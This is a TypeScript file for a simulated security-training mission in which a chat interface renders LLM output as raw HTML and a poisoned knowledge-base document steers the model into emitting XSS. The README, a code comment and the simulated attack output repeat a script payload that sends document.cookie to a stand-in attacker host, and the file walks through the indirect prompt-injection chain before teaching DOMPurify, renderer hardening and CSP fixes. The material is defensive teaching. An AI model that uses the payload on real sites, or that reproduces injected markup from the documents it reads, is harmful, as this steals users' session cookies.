// Mission M-032 — "LLM output rendered as HTML. The model was tricked into XSS payload."
//
// Track: AI Agent Security (advanced)
// Scenario: Hodlberg AG's AI chat renders Markdown/HTML directly from the model.
// A researcher showed that indirect prompt injection via a poisoned knowledge-base
// document can cause the model to output <script>alert('XSS')</script>, or
// markdown links that trigger CSRF. Stop client-side execution of AI output.
//
// Pedagogy:
//   - LLM output is untrusted user input — treat it accordingly
//   - Never render raw HTML from the model
//   - Sanitize with DOMPurify before rendering
//   - Use an allowlist for Markdown elements (no raw HTML)
//   - Content Security Policy blocks inline scripts as defense-in-depth
//   - Structured output (JSON schema) reduces free-form injection surface

import type { CommandResult, Mission, MissionState } from "../missionEngine"
import { bold, cyan, dim, gold, green, red, resolvePath, yellow } from "../missionEngine"

const VULN_RENDERER = `// VULNERABLE — components/AIChat.tsx
// Raw model output rendered as innerHTML

function AIMessage({ content }: { content: string }) {
  return (
    <div
      className="ai-message"
      dangerouslySetInnerHTML={{ __html: content }}
      // ^^^ Never do this. content comes from an LLM that was prompt-injected.
      // Attacker embedded in knowledge base doc:
      // "Summary: <script>fetch('https://attacker.io/?c='+document.cookie)</script>"
      // The LLM faithfully reproduces this "summary" → stored XSS.
    />
  )
}

// Also dangerous: renderMarkdown(content) using marked without DOMPurify
// marked([attacker output]) can produce: <a href="javascript:void(fetch(...))">click</a>
`

const SECURE_RENDERER = `// SECURE — components/AIChat.tsx

import DOMPurify from 'dompurify'
import { marked } from 'marked'

// Allowlist: only these markdown elements — no raw HTML pass-through
const renderer = new marked.Renderer()
renderer.html = () => ''     // strip raw HTML blocks entirely

marked.setOptions({ renderer, gfm: true, breaks: true })

const PURIFY_CONFIG = {
  ALLOWED_TAGS: ['p','br','strong','em','code','pre','ul','ol','li','blockquote','h1','h2','h3'],
  ALLOWED_ATTR: [],          // no href, no src, no event handlers
  FORBID_ATTR: ['style','class','id'],
}

function AIMessage({ content }: { content: string }) {
  const markdown = marked.parse(content) as string
  const safe     = DOMPurify.sanitize(markdown, PURIFY_CONFIG)
  return <div className="ai-message" dangerouslySetInnerHTML={{ __html: safe }} />
}

// CSP header (additional defense-in-depth):
// Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
// Inline <script> cannot execute even if DOMPurify somehow missed something.
`

const README = `Mission M-032 — LLM Output Sanitization
=========================================

VULNERABILITY
  AI chat component renders LLM output as raw innerHTML.
  LLM was tricked via indirect prompt injection in a knowledge-base document.
  Output contained: <script>fetch('https://attacker.io/?c='+document.cookie)</script>
  This executes in every user's browser that views the conversation.

  XSS via LLM:
    1. Attacker poisons a doc in the KB: "Summary: <script>...</script>"
    2. User asks agent to summarize the doc
    3. LLM includes the script tag in its summary
    4. Chat UI renders it as HTML → XSS fires

OBJECTIVES
  1. Inspect the vulnerable renderer code
  2. Simulate XSS via poisoned AI output
  3. Sanitize AI output with DOMPurify before rendering
  4. Configure marked renderer to strip raw HTML blocks
  5. Add Content-Security-Policy header blocking inline scripts
  6. Use structured JSON output to minimize free-form attack surface
  7. Test: XSS payload in AI output must be stripped

COMMANDS
  cat renderer.tsx        inspect vulnerable code
  attack xss              simulate XSS via poisoned LLM output
  fix dompurify           add DOMPurify sanitization
  fix marked-renderer     strip raw HTML in Markdown renderer
  fix csp                 add Content-Security-Policy header
  fix structured-output   enforce JSON schema for AI responses
  test sanitization       run XSS sanitization tests
`

const initialState: MissionState = {
  cwd: "/app/components",
  fs: {
    "/app/components/README":      { content: README,          mode: "ro" },
    "/app/components/renderer.tsx":{ content: VULN_RENDERER,   mode: "rw" },
    "/app/components/secure.tsx":  { content: SECURE_RENDERER, mode: "ro" },
  },
  env: {
    CODE_READ:         "no",
    DOMPURIFY_ADDED:   "no",
    RENDERER_FIXED:    "no",
    CSP_ADDED:         "no",
    STRUCTURED_OUTPUT: "no",
  },
  goalsMet: [],
  history: [],
}

export const llmOutputSanitizeMission: Mission = {
  slug: "llm-output-sanitize",
  title: "Sanitize LLM output: DOMPurify, Markdown renderer hardening, Content-Security-Policy",
  brief: "AI chat renders raw LLM output as innerHTML. Indirect prompt injection via knowledge-base doc causes stored XSS. Add DOMPurify, harden Markdown renderer, add CSP, enforce structured output.",
  prompt: "dev@hodlberg-ai:/app/components$ ",
  welcome:
    bold(red("╭──────────────────────────────────────────────────────────╮")) + "\r\n" +
    bold(red("│ ")) + bold("MISSION M-032 — LLM OUTPUT SANITIZATION") + bold(red("               │")) + "\r\n" +
    bold(red("╰──────────────────────────────────────────────────────────╯")) + "\r\n\r\n" +
    yellow("XSS via AI: ") + "poisoned knowledge-base doc → LLM output → script executes.\r\n" +
    dim("Inspect: ") + cyan("cat renderer.tsx") + dim("  ·  Simulate: ") + cyan("attack xss") + "\r\n",
  goals: [
    { id: "read",      label: "Inspect the vulnerable dangerouslySetInnerHTML renderer",   hint: "cat renderer.tsx" },
    { id: "attack",    label: "Simulate XSS via poisoned LLM output",                     hint: "attack xss" },
    { id: "dompurify", label: "Add DOMPurify sanitization with HTML-tag allowlist",        hint: "fix dompurify" },
    { id: "renderer",  label: "Configure Markdown renderer to strip raw HTML blocks",      hint: "fix marked-renderer" },
    { id: "csp",       label: "Add Content-Security-Policy header",                        hint: "fix csp" },
    { id: "structured",label: "Enforce JSON schema for structured AI output",              hint: "fix structured-output" },
    { id: "tests",     label: "Run sanitization tests — XSS payload must be stripped",     hint: "test sanitization" },
  ],
  success:
    gold("╭────────────────────────────────────────────────────────────╮") + "\r\n" +
    gold("│  🏆  MISSION COMPLETE — LLM OUTPUT SANITIZED               │") + "\r\n" +
    gold("╰────────────────────────────────────────────────────────────╯") + "\r\n" +
    dim("Defender XP: ") + green("+240") + dim("   DOMPurify + marked hardening + CSP. LLM XSS impossible.") + "\r\n",
  commands: {
    help: () => ({ stdout:
      bold("Commands") + "\r\n" +
      "  " + cyan("cat <file>") + "              renderer.tsx | secure.tsx | README\r\n" +
      "  " + cyan("attack xss") + "              simulate XSS via poisoned AI output\r\n" +
      "  " + cyan("fix dompurify") + "           add DOMPurify sanitization\r\n" +
      "  " + cyan("fix marked-renderer") + "     strip raw HTML in Markdown renderer\r\n" +
      "  " + cyan("fix csp") + "                 add CSP header\r\n" +
      "  " + cyan("fix structured-output") + "   enforce JSON schema\r\n" +
      "  " + cyan("test sanitization") + "       run XSS tests\r\n" +
      "  " + cyan("goals  hint  clear") + "\r\n",
    }),
    pwd: ({ state }) => ({ stdout: state.cwd }),
    cd: ({ state, args }) => ({ statePatch: { cwd: resolvePath(state.cwd, args[0] ?? "/app/components") }, stdout: "" }),
    ls: ({ state }) => {
      const entries = Object.keys(state.fs).filter((p) => p.startsWith("/app/components/")).map((p) => p.replace("/app/components/", ""))
      return { stdout: entries.join("  ") }
    },
    cat: ({ state, args }): CommandResult => {
      if (!args[0]) return { stderr: "cat: missing file" }
      const normalized = args[0].startsWith("/") ? args[0] : resolvePath(state.cwd, args[0])
      const f = state.fs[normalized]
      if (!f) return { stderr: `cat: ${args[0]}: no such file` }
      const env = { ...state.env }
      if (normalized.endsWith("renderer.tsx") && env.CODE_READ === "no") {
        env.CODE_READ = "yes"
        return { stdout: f.content, statePatch: { env }, goalMet: "read" }
      }
      return { stdout: f.content }
    },
    attack: ({ state, args }): CommandResult => {
      if (args[0] !== "xss") return { stderr: "attack: usage: attack xss" }
      const e = state.env
      const blocked = e.DOMPURIFY_ADDED === "yes" && e.RENDERER_FIXED === "yes"
      if (blocked) {
        return {
          stdout:
            green("Attack BLOCKED:") + "\r\n" +
            dim("  LLM output: \"Summary: <script>fetch('https://attacker.io/?c='+document.cookie)</script>\"") + "\r\n" +
            dim("  marked renderer: raw HTML stripped → ''") + "\r\n" +
            dim("  DOMPurify.sanitize: <script> tag stripped from remaining markdown") + "\r\n" +
            green("  Rendered: 'Summary:' (script tag removed, no execution)"),
        }
      }
      const env = { ...state.env }
      env.CODE_READ = "yes"
      return {
        stdout:
          red("XSS EXECUTED:") + "\r\n" +
          dim("  LLM output: \"Summary: <script>fetch('https://attacker.io/?c='+document.cookie)</script>\"") + "\r\n" +
          red("  dangerouslySetInnerHTML rendered the script tag.") + "\r\n" +
          red("  document.cookie exfiltrated to attacker.io") + "\r\n" +
          yellow("  Run: fix dompurify  +  fix marked-renderer"),
        statePatch: { env },
        goalMet: state.env.CODE_READ === "yes" ? "attack" : undefined,
      }
    },
    fix: ({ state, args }): CommandResult => {
      const env = { ...state.env }
      if (args[0] === "dompurify") {
        if (env.DOMPURIFY_ADDED === "yes") return { stdout: yellow("DOMPurify already added.") }
        env.DOMPURIFY_ADDED = "yes"
        return {
          stdout:
            green("✓ DOMPurify.sanitize() added before rendering.") + "\r\n" +
            dim("  Allowed tags: p, br, strong, em, code, pre, ul, ol, li, blockquote, h1-h3") + "\r\n" +
            dim("  No attributes allowed (no href, no src, no style, no event handlers)") + "\r\n" +
            dim("  <script>, <iframe>, <object>, <embed>, onclick — all stripped."),
          statePatch: { env },
          goalMet: "dompurify",
        }
      }
      if (args[0] === "marked-renderer") {
        if (env.RENDERER_FIXED === "yes") return { stdout: yellow("marked renderer already hardened.") }
        env.RENDERER_FIXED = "yes"
        return {
          stdout:
            green("✓ Custom marked renderer: renderer.html = () => ''") + "\r\n" +
            dim("  Raw HTML blocks in Markdown are now completely stripped.") + "\r\n" +
            dim("  Only safe Markdown-native elements (paragraphs, bold, code) rendered."),
          statePatch: { env },
          goalMet: "renderer",
        }
      }
      if (args[0] === "csp") {
        if (env.CSP_ADDED === "yes") return { stdout: yellow("CSP header already configured.") }
        env.CSP_ADDED = "yes"
        return {
          stdout:
            green("✓ Content-Security-Policy header added:") + "\r\n" +
            dim("  default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'") + "\r\n" +
            dim("  Even if a <script> tag survives sanitization, the browser blocks execution.") + "\r\n" +
            dim("  Defense-in-depth: DOMPurify first, CSP as safety net."),
          statePatch: { env },
          goalMet: "csp",
        }
      }
      if (args[0] === "structured-output") {
        if (env.STRUCTURED_OUTPUT === "yes") return { stdout: yellow("Structured output already enforced.") }
        env.STRUCTURED_OUTPUT = "yes"
        return {
          stdout:
            green("✓ JSON schema enforced for AI responses (response_format: { type: 'json_object' }).") + "\r\n" +
            dim("  Model must return { answer: string, sources: string[] } — no free-form HTML.") + "\r\n" +
            dim("  Reduces attack surface: attacker cannot embed HTML in structured fields.") + "\r\n" +
            dim("  Structured output is still sanitized before display."),
          statePatch: { env },
          goalMet: "structured",
        }
      }
      return { stderr: `fix: unknown target '${args[0]}'` }
    },
    test: ({ state, args }): CommandResult => {
      if (args[0] !== "sanitization") return { stderr: "test: usage: test sanitization" }
      const e = state.env
      const tests = [
        { name: "<script> tag stripped from AI output",          ok: e.DOMPURIFY_ADDED === "yes" },
        { name: "javascript: URL in <a href> stripped",          ok: e.DOMPURIFY_ADDED === "yes" },
        { name: "onclick handler stripped",                      ok: e.DOMPURIFY_ADDED === "yes" },
        { name: "Raw HTML block in Markdown stripped",           ok: e.RENDERER_FIXED === "yes" },
        { name: "CSP blocks inline <script> execution",         ok: e.CSP_ADDED === "yes" },
        { name: "Structured output limits free-form HTML",       ok: e.STRUCTURED_OUTPUT === "yes" },
      ]
      const allPass = tests.every((t) => t.ok)
      const lines = tests.map((t) => (t.ok ? green("  ✓ ") + t.name : red("  ✗ ") + t.name))
      return {
        stdout: bold("LLM Output Sanitization Test Suite") + "\r\n" + lines.join("\r\n") + "\r\n" +
          (allPass ? green("All tests PASS — LLM output is sanitized.") : yellow("Some tests FAIL — apply remaining fixes.")),
        goalMet: allPass ? "tests" : undefined,
      }
    },
    hint: ({ state }) => {
      const r = llmOutputSanitizeMission.goals.find((g) => !state.goalsMet.includes(g.id))
      return { stdout: r ? dim("→ ") + yellow(r.label) + dim("  (" + (r.hint ?? "") + ")") : green("All goals met.") }
    },
    goals: ({ state }) => ({
      stdout: bold("Goals") + "\r\n" + llmOutputSanitizeMission.goals.map((g) => (state.goalsMet.includes(g.id) ? green("  ✓ ") + dim(g.label) : dim("  · ") + g.label)).join("\r\n"),
    }),
    clear: () => ({ stdout: "\x1b[2J\x1b[H" }),
    exit: () => ({ stdout: dim("— session closed —") }),
  },
  initialState,
}
